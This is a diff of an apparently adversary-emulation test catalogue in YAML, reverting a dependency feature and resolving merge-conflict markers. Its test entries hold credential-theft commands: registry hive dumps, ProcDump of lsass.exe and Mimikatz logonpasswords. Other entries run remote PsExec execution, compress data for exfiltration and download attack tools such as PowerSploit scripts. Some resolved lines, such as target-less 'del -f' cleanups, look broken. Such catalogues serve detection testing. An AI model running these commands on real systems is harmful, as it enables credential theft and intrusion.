@@ -15668,11 +15668,7 @@ impact:
         prereq_command: 'net.exe user #{user_account}
 
 '
-<<<<<<< HEAD
-        cleanup_command: 'net.exe user #{user_account} /delete
-=======
         command: 'net.exe user #{user_account} #{new_password}
->>>>>>> parent of 511bb87... Add Dependencies section to test Yaml and support to use them in the PS execution framework (#772)
 
 '
     - name: Delete User - Windows
@@ -15812,25 +15808,16 @@ impact:
       supported_platforms:
       - windows
       input_arguments:
-        sdelete_exe:
-          description: Path of sdelete executable
+        sdelete_path:
+          description: Path to sdelete.exe
           type: Path
-          default: PathToAtomicsFolder\T1485\bin\sdelete.exe
-      dependency_executor_name: powershell
-      dependencies:
-      - description: Secure delete tool from Sysinternals must exist on disk at specified
-          location (#{sdelete_exe})
-        prereq_command: 'if (Test-Path #{sdelete_exe}) {0} else {1}'
-        get_prereq_command: |-
-          Invoke-WebRequest "https://download.sysinternals.com/files/SDelete.zip" -OutFile "$env:TEMP\SDelete.zip"
-          Expand-Archive $env:TEMP\SDelete.zip $env:TEMP\Sdelete -Force
-          New-Item -ItemType Directory (Split-Path "#{sdelete_exe}") -Force | Out-Null
-          Copy-Item $env:TEMP\Sdelete\sdelete.exe "#{sdelete_exe}" -Force
+          default: ''
       executor:
         name: powershell
         command: |
           New-Item $env:TEMP\T1485.txt
-          #{sdelete_exe} -accepteula $env:TEMP\T1485.txt
+          Set-Location #{sdelete_path}
+          .\sdelete.exe -accepteula $env:TEMP\T1485.txt
     - name: macOS/Linux - Overwrite file with DD
       description: |
         Overwrites and deletes a file using DD.
@@ -19701,35 +19688,7 @@ credential-access:
         output_file:
           description: Path where resulting data should be placed
           type: Path
-<<<<<<< HEAD
-          default: "%temp%\\output.txt"
-        wce_exe:
-          description: Path of Windows Credential Editor executable
-          type: Path
-          default: PathToAtomicsFolder\T1003\bin\wce.exe
-        wce_url:
-          description: Path to download Windows Credential Editor zip file
-          type: url
-          default: https://www.ampliasecurity.com/research/wce_v1_41beta_universal.zip
-        wce_zip_hash:
-          description: File hash of the Windows Credential Editor zip file
-          type: String
-          default: 8F4EFA0DDE5320694DD1AA15542FE44FDE4899ED7B3A272063902E773B6C4933
-      dependency_executor_name: powershell
-      dependencies:
-      - description: Windows Credential Editor must exist on disk at specified location
-          (#{wce_exe})
-        prereq_command: 'if (Test-Path #{wce_exe}) {0} else {1}'
-        get_prereq_command: |-
-          $parentpath = Split-Path "#{wce_exe}"; $zippath = "$parentpath\wce.zip"
-          if(Invoke-WebRequestVerifyHash "#{wce_url}" "$zippath" #{wce_zip_hash}){
-            Expand-Archive $zippath $parentpath\wce -Force
-            Move-Item $parentpath\wce\wce.exe "#{wce_exe}"
-            Remove-Item $zippath, $parentpath\wce -Recurse
-          }
-=======
           default: output.txt
->>>>>>> parent of 511bb87... Add Dependencies section to test Yaml and support to use them in the PS execution framework (#772)
       executor:
         name: command_prompt
         elevation_required: true
@@ -19742,17 +19701,22 @@ credential-access:
         via three registry keys. Then processed locally using https://github.com/Neohapsis/creddump7
       supported_platforms:
       - windows
+      input_arguments:
+        output_folder:
+          description: Output folder path
+          type: Path
+          default: C:\Windows\Temp
       executor:
         name: command_prompt
         elevation_required: true
         command: |
-          reg save HKLM\sam %temp%\sam
-          reg save HKLM\system %temp%\system
-          reg save HKLM\security %temp%\security
+          reg save HKLM\sam "#{output_folder}\sam"
+          reg save HKLM\system "#{output_folder}\system"
+          reg save HKLM\security "#{output_folder}\security"
         cleanup_command: |
-          rm %temp%\sam
-          rm %temp%\system
-          rm %temp%\security
+          rm "#{output_folder}\sam"
+          rm "#{output_folder}\system"
+          rm "#{output_folder}\security"
     - name: Dump LSASS.exe Memory using ProcDump
       description: |
         The memory of lsass.exe is often dumped for offline credential theft attacks. This can be achieved with Sysinternals
@@ -19760,28 +19724,19 @@ credential-access:
       supported_platforms:
       - windows
       input_arguments:
+        procdump_binary_path:
+          description: Path of the ProcDump binary
+          type: string
+          default: "$PathToAtomicsFolder\\T1003\\bin\\procdump64.exe"
         output_file:
           description: Path where resulting dump should be placed
           type: Path
           default: C:\Windows\Temp\lsass_dump.dmp
-        procdump_exe:
-          description: Path of Procdump executable
-          type: Path
-          default: PathToAtomicsFolder\T1003\bin\procdump.exe
-      dependency_executor_name: powershell
-      dependencies:
-      - description: ProcDump tool from Sysinternals must exist on disk at specified
-          location (#{procdump_exe})
-        prereq_command: 'if (Test-Path #{procdump_exe}) {0} else {1}'
-        get_prereq_command: |-
-          Invoke-WebRequest "https://download.sysinternals.com/files/Procdump.zip" -OutFile "$env:TEMP\Procdump.zip"
-          Expand-Archive $env:TEMP\Procdump.zip $env:TEMP\Procdump -Force
-          New-Item -ItemType Directory (Split-Path #{procdump_exe}) -Force | Out-Null
-          Copy-Item $env:TEMP\Procdump\Procdump.exe #{procdump_exe} -Force
       executor:
         elevation_required: true
         name: command_prompt
-        command: 'procdump.exe -accepteula -ma lsass.exe #{output_file}
+        command: "#{procdump_binary_path} -accepteula -ma lsass.exe #{output_file}\n"
+        cleanup_command: 'rm "#{output_file}"
 
 '
     - name: Dump LSASS.exe Memory using Windows Task Manager
@@ -19810,21 +19765,21 @@ credential-access:
       supported_platforms:
       - windows
       input_arguments:
+        mimikatz_binary_path:
+          description: Path of the Mimikatz binary
+          type: string
+          default: "$PathToAtomicsFolder\\T1003\\bin\\mimikatz.exe"
         input_file:
-          description: Path where resulting dump should be placed
+          description: Path of the Lsass dump
           type: Path
-          default: lsass_dump.dmp
+          default: C:\Windows\Temp\lsass_dump.dmp
       executor:
-        name: manual
-        steps: |
-          1. Open Mimikatz:
-            Execute `mimikatz` at a command prompt.
+        name: command_prompt
+        elevation_required: true
+        command: '#{mimikatz_binary_path} "sekurlsa::minidump #{input_file}" "sekurlsa::logonpasswords
+          full" exit
 
-          2. Select a Memory Dump:
-            Within the Mimikatz interactive shell, execute `sekurlsa::minidump #{input_file}`
-
-          3. Obtain Credentials:
-            Within the Mimikatz interactive shell, execute `sekurlsa::logonpasswords full`
+'
     - name: Dump Active Directory Database with NTDSUtil
       description: |
         The Active Directory database NTDS.dit may be dumped using NTDSUtil for offline credential theft attacks. This capability
@@ -19837,12 +19792,6 @@ credential-access:
           description: Path where resulting dump should be placed
           type: Path
           default: C:\Windows\Temp
-      dependencies:
-      - description: Target must be a Domain Controller
-        prereq_command: reg query HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\ProductOptions  /v
-          ProductType | findstr LanmanNT
-        get_prereq_command: echo Sorry, Promoting this machine to a Domain Controller
-          must be done manually
       executor:
         name: command_prompt
         elevation_required: true
@@ -19884,19 +19833,6 @@ credential-access:
           description: Path for extracted NTDS.dit
           type: Path
           default: C:\Windows\Temp
-      dependencies:
-      - description: Target must be a Domain Controller
-        prereq_command: reg query HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\ProductOptions  /v
-          ProductType | findstr LanmanNT
-        get_prereq_command: echo Sorry, Promoting this machine to a Domain Controller
-          must be done manually
-      - description: Volume shadow copy must exist
-        prereq_command: 'if not exist #{vsc_name} (exit /b 1)'
-        get_prereq_command: echo Run "Invoke-AtomicTest T1003 -TestName 'Create Volume
-          Shadow Copy with NTDS.dit'" to fulfuill this requirement
-      - description: Extract path must exist
-        prereq_command: 'if not exist #{extract_path} (exit /b 1)'
-        get_prereq_command: 'mkdir #{extract_path}'
       executor:
         name: command_prompt
         elevation_required: true
@@ -19933,27 +19869,7 @@ credential-access:
         gpp_script_path:
           description: Path to the Get-GPPPassword PowerShell Script
           type: Path
-<<<<<<< HEAD
-          default: PathToAtomicsFolder\T1003\src\Get-GPPPassword.ps1
-        gpp_script_url:
-          description: URL of the Get-GPPPassword PowerShell Script
-          type: url
-          default: https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/87630cac639f29c2adcb163f661f02890adf4bdd/Exfiltration/Get-GPPPassword.ps1
-      dependency_executor_name: powershell
-      dependencies:
-      - description: 'Get-GPPPassword PowerShell Script must exist at #{gpp_script_path}'
-        prereq_command: if(Test-Path "#{gpp_script_path}") { 0 } else { 1 }
-        get_prereq_command: |-
-          New-Item -ItemType Directory (Split-Path "#{gpp_script_path}") -Force | Out-Null
-          Invoke-WebRequest #{gpp_script_url} -OutFile "#{gpp_script_path}"
-      - description: Computer must be domain joined
-        prereq_command: if((Get-CIMInstance -Class Win32_ComputerSystem).PartOfDomain)
-          {0} else {1}
-        get_prereq_command: Write-Host Joining this computer to a domain must be done
-          manually
-=======
           default: "$PathToAtomicsFolder\\T1003\\src\\Get-GPPPassword.ps1"
->>>>>>> parent of 511bb87... Add Dependencies section to test Yaml and support to use them in the PS execution framework (#772)
       executor:
         name: powershell
         elevation_required: false
@@ -19967,16 +19883,6 @@ credential-access:
       supported_platforms:
       - windows
       input_arguments:
-<<<<<<< HEAD
-        ninjacopy_script_path:
-          description: Path to the Invoke-NinjaCopy PowerShell script
-          type: Path
-          default: PathToAtomicsFolder\T1003\src\Invoke-NinjaCopy.ps1
-        ninjacopy_script_url:
-          description: URL of the Invoke-NinjaCopy PowerShell Script
-          type: url
-          default: https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/6b0ada999a9d2be8c6c9267da57b898494d13219/Exfiltration/Invoke-NinjaCopy.ps1
-=======
         sam_binary_path:
           description: Path of the SAM file
           type: string
@@ -19989,7 +19895,6 @@ credential-access:
           description: Path of the SECURITY file
           type: string
           default: C:\Windows\System32\config\security
->>>>>>> parent of 511bb87... Add Dependencies section to test Yaml and support to use them in the PS execution framework (#772)
         output_folder:
           description: Output folder path
           type: Path
@@ -23201,12 +23106,9 @@ execution:
         prereq_command: 'if(Test-Path #{psexec_path}) {0} else {1}
 
 '
-<<<<<<< HEAD
-=======
         command: '#{psexec_path} \\#{remote_host} "C:\Windows\System32\calc.exe"
 
 '
->>>>>>> parent of 511bb87... Add Dependencies section to test Yaml and support to use them in the PS execution framework (#772)
   T1218:
     technique:
       x_mitre_data_sources:
@@ -26535,16 +26437,10 @@ exfiltration:
         prereq_command: 'rar /?
 
 '
-<<<<<<< HEAD
-        cleanup_command: 'del #{output_file}
-
-'
-=======
         command: 'rar a -r #{output_file} #{input_path} *#{file_extension}
 
 '
         cleanup_command: del -f
->>>>>>> parent of 511bb87... Add Dependencies section to test Yaml and support to use them in the PS execution framework (#772)
     - name: Data Compressed - nix - zip
       description: 'An adversary may compress data (e.g., sensitive documents) that
         is collected prior to exfiltration. This test uses standard zip compression.
@@ -26572,13 +26468,7 @@ exfiltration:
         command: 'zip #{output_file} #{input_files}
 
 '
-<<<<<<< HEAD
-        cleanup_command: 'rm -f #{output_file}
-
-'
-=======
         cleanup_command: rm -f
->>>>>>> parent of 511bb87... Add Dependencies section to test Yaml and support to use them in the PS execution framework (#772)
     - name: Data Compressed - nix - gzip Single File
       description: 'An adversary may compress data (e.g., sensitive documents) that
         is collected prior to exfiltration. This test uses standard gzip compression.
@@ -26736,31 +26626,6 @@ exfiltration:
         wzzip sample.zip -s"blueblue" *.txt (VARIANT)
       supported_platforms:
       - windows
-<<<<<<< HEAD
-      input_arguments:
-        winzip_exe:
-          description: Path to installed Winzip executable
-          type: Path
-          default: "%ProgramFiles%\\WinZip\\winzip64.exe"
-        winzip_url:
-          description: Path to download Windows Credential Editor zip file
-          type: url
-          default: https://download.winzip.com/gl/nkln/winzip24-home.exe
-        winzip_hash:
-          description: File hash of the Windows Credential Editor zip file
-          type: String
-          default: B59DB592B924E963C21DA8709417AC0504F6158CFCB12FE5536F4A0E0D57D7FB
-      dependency_executor_name: powershell
-      dependencies:
-      - description: Winzip must be installed
-        prereq_command: cmd /c 'if not exist "#{winzip_exe}" (echo 1) else (echo 0)'
-        get_prereq_command: |-
-          if(Invoke-WebRequestVerifyHash "#{winzip_url}" "$env:Temp\winzip.exe" #{winzip_hash}){
-            Write-Host Follow the installation prompts to continue
-            cmd /c "$env:Temp\winzip.exe"
-          }
-=======
->>>>>>> parent of 511bb87... Add Dependencies section to test Yaml and support to use them in the PS execution framework (#772)
       executor:
         name: command_prompt
         elevation_required: false
